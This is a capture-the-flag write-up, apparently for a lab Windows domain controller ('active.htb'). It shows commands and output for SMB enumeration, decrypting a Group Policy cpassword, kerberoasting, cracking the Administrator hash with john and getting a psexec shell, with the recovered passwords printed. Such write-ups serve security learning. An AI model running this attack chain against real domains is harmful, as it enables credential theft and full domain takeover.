#Pwned #Windows #Updated #Kerberoast

```IP
10.10.10.100
```
# Enumeration
## Nmap
As always I start enumerating target ports with nmap:
```Bash
sudo nmap -sCV 10.10.10.100 -vvv -p- -oN enum/full
```
The output being:
```
PORT      STATE SERVICE       REASON          VERSION
53/tcp    open  domain        syn-ack ttl 127 Microsoft DNS 6.1.7601 (1DB15D39) (Windows Server 2008 R2 SP1)
| dns-nsid: 
|_  bind.version: Microsoft DNS 6.1.7601 (1DB15D39)
88/tcp    open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2024-12-22 09:01:28Z)
135/tcp   open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
389/tcp   open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds? syn-ack ttl 127
464/tcp   open  kpasswd5?     syn-ack ttl 127
593/tcp   open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped    syn-ack ttl 127
3268/tcp  open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped    syn-ack ttl 127
5722/tcp  open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
9389/tcp  open  mc-nmf        syn-ack ttl 127 .NET Message Framing
47001/tcp open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49152/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49153/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49154/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49155/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49157/tcp open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
49158/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49165/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49166/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49173/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1, cpe:/o:microsoft:windows
```
## SMB
After finding SMB with nmap, we will use netexec tool in order to enumerate the service:
```Bash
nxc smb 10.10.10.100 -u '' -p '' --shares
```
```Bash
smbclient //10.10.10.100/Replication
```
![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241222100646.png?raw=true)
Since it does not have authentication requirements enabled, we are able to enumerate the shares. Replication share inmediately stands out.

Iside it, in the `\active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Preferences\Groups` directory it is possible to find a Groups.xml file that seems to contain credentials for SVC_TGS account as shown below:

![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241222100923.png?raw=true)

# Exploitation
If we google `groups.xml cpassword decrypt` we will get some github pages for decrypting the password like:
https://github.com/t0thkr1s/gpp-decrypt
The command for this particular exploit would be:
```Bash
python gpp-decrypt.py -f ../../files/Groups.xml
```
And voilà!
![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241222102733.png?raw=true)

Our password is:
```
GPPstillStandingStrong2k18
```
We can now enumerate other users:

![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241222102912.png?raw=true)

Let's try some AD attack methods. As Rep Roasting attack doesn't seem to work:
```Bash
impacket-GetNPUsers -dc-ip 10.10.10.100 active.htb/svc_tgs
```
![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241222103324.png?raw=true)

But kerberoast does!
```Bash
impacket-GetUserSPNs -request -dc-ip 10.10.10.100 active.htb/svc_tgs
```
![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241222103349.png?raw=true)

It retrieves an Administrator hash. Let's try cracking it with john:
```Bash
john --wordlist=/usr/share/wordlists/rockyou.txt files/administrator.hash
```
![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241222103639.png?raw=true)

```
Ticketmaster1968
```
Now we can goin with PSExec:
```Bash
impacket-psexec active.htb/Administrator:Ticketmaster1968@10.10.10.100
```
And we get access as Administrator right away. The final step is, as always, to retrieve the flag:
![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241222104100.png?raw=true)

We have successfully pwned the machine!